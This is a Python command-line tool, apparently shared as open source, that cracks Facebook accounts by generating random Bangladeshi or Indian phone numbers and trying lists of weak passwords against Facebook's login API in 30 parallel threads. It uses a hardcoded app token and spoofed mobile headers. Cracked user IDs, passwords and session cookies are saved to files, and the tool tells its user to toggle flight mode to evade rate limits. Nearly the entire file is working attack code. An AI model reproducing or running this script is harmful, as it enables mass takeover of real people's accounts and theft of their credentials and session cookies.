#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Tanim Hossain [BHOOT-CYBER]
RIZZUeloper : Tanim Hossain
Github    : Bhoot-Cyber-143
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /RIZZU/null')
except:pass

###----------[ USER AGENT ]---------- ###
  
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/230.0.474234691 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/635.1'
'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.129 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; Pearl K3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; V2026 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Z981) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 EdgA/105.0.1343.42'
'Mozilla/5.0 (Linux; Android 11; SM-A125W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74'
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 HuaweiBrowser/12.1.1.324 HMSCore/6.7.0.322'
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0'
'Opera/5.11 (Windows 98; U) [en]'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/6.0 (Windows 2000; U) [fr]'
'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]'
'Opera/7.03 (Windows NT 5.0; U) [en]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/9.02 (Windows XP; U; ru)'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)'
'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1'
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00'
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00'
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10'
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11'
'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4'
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)'
'Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25'
'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]'
'Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5647.206 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Magnet_G30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5663.218 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; TVBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5616.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5622.208 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5667.195 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; e-tab 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5669.213 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; MRX-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5645.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.219 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5658.220 Safari/537.36 OPR/97.0.3429.147",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5624.206 Safari/537.36 OPR/97.0.3248.58",]  

#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91875 | +91972 | +91934';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = """                                                               
     

\033[1;37m██████╗ ██╗███████╗███████╗██╗   ██╗
\033[1;37m██╔══██╗██║╚══███╔╝╚══███╔╝██║   ██║
\033[1;37m██████╔╝██║  ███╔╝   ███╔╝ ██║   ██║
\033[1;37m██╔══██╗██║ ███╔╝   ███╔╝  ██║   ██║
\033[1;37m██║  ██║██║███████╗███████╗╚██████╔╝
\033[1;37m╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝ 
                                    
 
                                                                                                                        
[+]___________________________________________________________
[+]\033[1;32m CREATED BY   : \033[1;32m RIZWAN KHAN
[+]\033[1;32m FB GROUP     :  \033[1;32m RIZZU H3LPING ZON3
[+]\033[1;32m BROTHER      :   \033[1;32mRIZZU RIZWAN
[+]\033[1;32m TOOL STATUS  : \033[1;32m RANDOM
[+]\033[1;32m TOOL VIRSION :\033[1;32m   8.0
[+]\033[1;32m BESTFRIENDS  :\033[1;32m  ALONE
[+]___________________________________________________________"""
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' (1) Random Cracking \n (2) admin contect \n (3) Exit Manu ');line()
    manu = input(f' (+) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (+) {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 1 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Choice Sim Code : ')
        fresh();print(f' (+) Example : 10000 | 20000 | 50000 ');line();limit = int(input(f' (+) Crack Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 1 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (RIZZU💙) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.27.57;FBBV/573810848;FBRV/0;FBPN/com.facebook.katana;FBLC/vi_VN;FBMF/Era 2X;FBBD/Era 2X;FBDV/XOLO;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','RIZZUice_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_RIZZUice_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-AMILice-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                print(f'\r{g} (RIZZU💙) {str(uid)} | {pas} ')
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                if 'y' in cokix:print(f'\r{g} (RIZZU) : {coki} ')
                                open('/sdcard/RIZZU-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (RIZZU) {str(uid)} | {pas} ')
                                open('/sdcard/RIZZU💙-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ END-CODE ]-----------------------#
Main()
